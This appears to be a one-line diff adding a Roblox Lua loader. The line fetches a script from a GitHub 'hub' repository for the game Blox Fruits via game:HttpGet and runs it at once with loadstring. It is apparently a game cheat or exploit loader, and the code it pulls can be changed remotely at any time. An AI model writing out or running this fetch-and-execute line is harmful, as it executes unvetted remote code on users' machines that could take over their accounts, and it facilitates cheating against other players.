@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/The-kingzinhu/The_kingzinhu_hub_v2/main/blox-fruits"))()
